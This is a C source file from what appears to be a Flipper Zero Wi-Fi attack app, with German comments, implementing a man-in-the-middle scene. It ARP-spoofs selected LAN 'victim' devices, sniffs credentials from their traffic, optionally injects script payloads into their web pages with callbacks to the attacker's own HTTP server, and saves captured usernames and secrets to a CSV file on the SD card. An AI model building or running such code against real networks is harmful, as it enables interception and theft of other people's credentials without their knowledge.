#include "../wlan_app.h"
#include "../wlan_netcut.h"
#include "../wlan_cred_sniff.h"
#include "../wlan_html_inject.h"
#include "../wlan_mitm_server.h"
#include "../wlan_mitm_payloads.h"
#include "../wlan_hal.h"

// Run-Scene des MiTM-Features (vormals "Live Creds"). Settings (Inject ein/aus,
// Inject-Code, Store-Cred) kommen aus app->mitm_*, gesetzt in scene_mitm_menu.

#include <storage/storage.h>
#include <furi_hal_rtc.h>
#include <datetime/datetime.h>
#include <stdio.h>
#include <string.h>

// Wie viele Devices maximal automatisch (ohne explizite Vorauswahl) in den
// Monitor-Mode versetzt werden — jeder gemonitorte Frame round-trippt durch die
// einzige async-TX-Queue; zu viele saturieren das und das Opfer verliert Pakete.
#define LC_AUTO_MONITOR_MAX 4

#define LC_SCRATCH 8

static Storage* s_lc_storage = NULL;
static File* s_lc_file = NULL;
static WlanCredEntry s_lc_scratch[LC_SCRATCH]; // Drain-Puffer (GUI-Stack ist knapp → static)
static WlanCredEntry s_lc_snap[WLAN_CRED_RING_SIZE];
static bool s_lc_active; // true wenn Monitor läuft (sonst Fehlerbildschirm)
static uint16_t s_lc_restoring_ticks; // > 0 während "Restoring..."-Overlay nach Back-Press

#define LC_RESTORING_TICKS 12 // ~3s, wie at_show_restoring

// ---------------------------------------------------------------------------
// CSV
// ---------------------------------------------------------------------------
static void lc_csv_escape(char* s) {
    for(; *s; s++)
        if(*s == ',' || *s == '\n' || *s == '\r') *s = ' ';
}

static void lc_open_csv(void) {
    s_lc_storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(s_lc_storage, "/ext/wifi");
    storage_common_mkdir(s_lc_storage, "/ext/wifi/live_creds");
    const char* path = "/ext/wifi/live_creds/creds.csv";
    bool exists = storage_common_stat(s_lc_storage, path, NULL) == FSE_OK;
    s_lc_file = storage_file_alloc(s_lc_storage);
    if(!storage_file_open(s_lc_file, path, FSAM_WRITE, FSOM_OPEN_APPEND)) {
        storage_file_free(s_lc_file);
        s_lc_file = NULL;
        furi_record_close(RECORD_STORAGE);
        s_lc_storage = NULL;
        return;
    }
    if(!exists) {
        const char* hdr = "timestamp,victim_ip,proto,host,peer,user,secret,raw\n";
        storage_file_write(s_lc_file, hdr, strlen(hdr));
    }
}

static void lc_close_csv(void) {
    if(s_lc_file) {
        storage_file_close(s_lc_file);
        storage_file_free(s_lc_file);
        s_lc_file = NULL;
    }
    if(s_lc_storage) {
        furi_record_close(RECORD_STORAGE);
        s_lc_storage = NULL;
    }
}

static void lc_write_csv(const WlanCredEntry* e) {
    if(!s_lc_file) return;
    DateTime dt;
    furi_hal_rtc_get_datetime(&dt);
    const uint8_t* vi = (const uint8_t*)&e->victim_ip;
    const uint8_t* pi = (const uint8_t*)&e->peer_ip;
    char host[WLAN_CRED_STR_MAX], user[WLAN_CRED_STR_MAX], secret[WLAN_CRED_STR_MAX];
    char raw[WLAN_CRED_RAW_MAX];
    strncpy(host, e->host, sizeof(host));
    host[sizeof(host) - 1] = 0;
    lc_csv_escape(host);
    strncpy(user, e->user, sizeof(user));
    user[sizeof(user) - 1] = 0;
    lc_csv_escape(user);
    strncpy(secret, e->secret, sizeof(secret));
    secret[sizeof(secret) - 1] = 0;
    lc_csv_escape(secret);
    strncpy(raw, e->raw_body, sizeof(raw));
    raw[sizeof(raw) - 1] = 0;
    lc_csv_escape(raw);
    char line[480];
    int n = snprintf(
        line,
        sizeof(line),
        "%04u-%02u-%02u %02u:%02u:%02u,%u.%u.%u.%u,%s,%s,%u.%u.%u.%u:%u,%s,%s,%s\n",
        dt.year,
        dt.month,
        dt.day,
        dt.hour,
        dt.minute,
        dt.second,
        vi[0],
        vi[1],
        vi[2],
        vi[3],
        e->proto,
        host,
        pi[0],
        pi[1],
        pi[2],
        pi[3],
        (unsigned)e->peer_port,
        user,
        secret,
        raw);
    if(n > 0) storage_file_write(s_lc_file, line, (size_t)n);
}

// ---------------------------------------------------------------------------
// Monitor-Mode armen/disarmen
// ---------------------------------------------------------------------------
// sniff_monitor setzen:
//  - hat der Aufrufer schon Devices vorgemerkt → genau die behalten
//  - sonst, gibt es aktive Targets → die (gedeckelt auf LC_AUTO_MONITOR_MAX)
//  - sonst → die ersten LC_AUTO_MONITOR_MAX Devices
// Geblockte Devices werden nie gemonitort (block ist exklusiv).
// Liefert true wenn mind. ein Device gemonitort wird.
static bool lc_arm_monitor(WlanApp* app) {
    bool pre = false;
    for(uint16_t i = 0; i < app->device_count; i++) {
        if(app->devices[i].sniff_monitor) {
            pre = true;
            break;
        }
    }
    if(pre) {
        bool any = false;
        for(uint16_t i = 0; i < app->device_count; i++) {
            if(app->devices[i].block_internet) app->devices[i].sniff_monitor = false;
            if(app->devices[i].sniff_monitor) any = true;
        }
        if(any) return true;
        // alle vorgemerkten waren geblockt → Auto-Logik unten
    }

    bool any_target = false;
    for(uint16_t i = 0; i < app->device_count; i++) {
        if(app->devices[i].active && !app->devices[i].block_internet) {
            any_target = true;
            break;
        }
    }
    uint16_t budget = LC_AUTO_MONITOR_MAX;
    bool any = false;
    for(uint16_t i = 0; i < app->device_count; i++) {
        WlanDeviceRecord* d = &app->devices[i];
        bool eligible = !d->block_internet && (!any_target || d->active);
        bool want = eligible && budget > 0;
        if(want) budget--;
        d->sniff_monitor = want;
        if(want) any = true;
    }
    return any;
}

static void lc_disarm_monitor(WlanApp* app) {
    for(uint16_t i = 0; i < app->device_count; i++)
        app->devices[i].sniff_monitor = false;
}

static void lc_show_error(WlanApp* app, const char* msg) {
    widget_reset(app->widget);
    widget_add_string_element(
        app->widget, 64, 26, AlignCenter, AlignCenter, FontPrimary, "MiTM");
    widget_add_string_element(app->widget, 64, 42, AlignCenter, AlignCenter, FontSecondary, msg);
    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewWidget);
}

// Restoring-Overlay (Pattern wie scene_attack_targets at_show_restoring) —
// hält die Scene noch ~3 s offen, damit der Worker die ARP-Restore-Bursts
// für die Opfer-Devices senden kann, bevor wir zur Settings-Scene zurückpoppen.
static void lc_show_restoring(WlanApp* app) {
    widget_reset(app->widget);
    widget_add_rect_element(app->widget, 14, 22, 100, 20, 3, false);
    widget_add_string_element(
        app->widget, 64, 32, AlignCenter, AlignCenter, FontSecondary, "Restoring devices...");
    s_lc_restoring_ticks = LC_RESTORING_TICKS;
    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewWidget);
}

// Sauberes Disarm + apply(). Wird sowohl beim Back-Press als auch (als
// Fallback) aus on_exit gerufen. Idempotent — ein zweiter Aufruf ist no-op.
static bool lc_disarm_and_restore(WlanApp* app) {
    if(!s_lc_active) return false;
    lc_close_csv();
    wlan_cred_sniff_set_armed(app->cred_sniff, false);
    wlan_html_inject_set_armed(false);
    wlan_mitm_server_stop();
    lc_disarm_monitor(app);
    bool restore_triggered =
        wlan_netcut_apply(app->netcut, app->devices, (uint8_t)app->device_count);
    s_lc_active = false;
    return restore_triggered;
}

static uint16_t lc_count_victims(WlanApp* app) {
    uint16_t n = 0;
    for(uint16_t i = 0; i < app->device_count; i++) {
        if(app->devices[i].sniff_monitor) n++;
    }
    return n;
}

// ---------------------------------------------------------------------------
void wlan_app_scene_live_creds_on_enter(void* context) {
    WlanApp* app = context;
    s_lc_active = false;

    if(!wlan_netcut_preflight(app->netcut)) {
        lc_disarm_monitor(app);
        lc_show_error(app, "Connect as STA + scan LAN");
        return;
    }
    if(!lc_arm_monitor(app)) {
        lc_disarm_monitor(app);
        lc_show_error(app, "No LAN device - scan first");
        return;
    }

    wlan_cred_sniff_set_armed(app->cred_sniff, true);
    if(app->mitm_inject_enabled) {
        // %%MY_IP%% im Template auflösen können — eigene STA-IP übergeben.
        wlan_html_inject_set_my_ip(wlan_hal_get_own_ip());
        // Payload-Auswahl: bei "custom" (oder kaputtem Index) den vom User
        // eingetippten mitm_inject_code nehmen, sonst die SD-Datei laden. Wir
        // schreiben in mitm_inject_code zurück, damit beim Re-Enter der
        // Inject-Code-Scene der zuletzt verwendete Payload sichtbar ist.
        if(app->mitm_payload_index < app->mitm_payloads.count) {
            const char* name = app->mitm_payloads.items[app->mitm_payload_index].name;
            char buf[sizeof(app->mitm_inject_code)];
            if(wlan_mitm_payloads_load(name, buf, sizeof(buf))) {
                memcpy(app->mitm_inject_code, buf, sizeof(buf));
                app->mitm_inject_code[sizeof(app->mitm_inject_code) - 1] = '\0';
            }
        }
        wlan_html_inject_set_code(app->mitm_inject_code);
        wlan_html_inject_set_armed(true);
    } else {
        wlan_html_inject_set_armed(false);
    }
    // HTTP-Server für eingehende Inject-Callbacks (/k=<value> → [LOG]).
    wlan_mitm_server_start(app->cred_sniff);
    wlan_netcut_apply(app->netcut, app->devices, (uint8_t)app->device_count);

    wlan_live_creds_view_reset(app->live_creds_view_obj);
    wlan_live_creds_view_set_victim_count(app->live_creds_view_obj, lc_count_victims(app));
    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewLiveCreds);
    if(app->mitm_store_cred) lc_open_csv();
    s_lc_active = true;
}

bool wlan_app_scene_live_creds_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;

    if(event.type == SceneManagerEventTypeBack) {
        // Aktive Session → erst sauber disarmen, dann Restore-Overlay zeigen
        // damit der Worker die ARPs ausschickt bevor die Scene weg ist.
        if(s_lc_active) {
            bool r = lc_disarm_and_restore(app);
            if(r) {
                lc_show_restoring(app);
                return true; // Back konsumieren — Scene bleibt für das Overlay
            }
        }
        return false; // sofortiger Pop
    }

    if(event.type == SceneManagerEventTypeTick) {
        if(s_lc_restoring_ticks > 0) {
            s_lc_restoring_ticks--;
            if(s_lc_restoring_ticks == 0) {
                scene_manager_previous_scene(app->scene_manager);
            }
            return false;
        }
        if(s_lc_active) {
            uint32_t n;
            do {
                n = wlan_cred_sniff_drain(app->cred_sniff, s_lc_scratch, LC_SCRATCH);
                if(app->mitm_store_cred) {
                    for(uint32_t i = 0; i < n; i++) lc_write_csv(&s_lc_scratch[i]);
                }
            } while(n == LC_SCRATCH);
            uint32_t m =
                wlan_cred_sniff_snapshot(app->cred_sniff, s_lc_snap, WLAN_CRED_RING_SIZE);
            wlan_live_creds_view_set_entries(
                app->live_creds_view_obj, s_lc_snap, m, wlan_cred_sniff_total(app->cred_sniff));
        }
    }
    return false;
}

void wlan_app_scene_live_creds_on_exit(void* context) {
    WlanApp* app = context;
    // Fallback — falls die Scene nicht via Back-Press verlassen wurde (z.B.
    // App-Close, Scene-Switch via Custom-Event), s_lc_active ist hier noch
    // true und der Disarm/Apply läuft erst jetzt.
    lc_disarm_and_restore(app);
    widget_reset(app->widget);
    s_lc_restoring_ticks = 0;
}
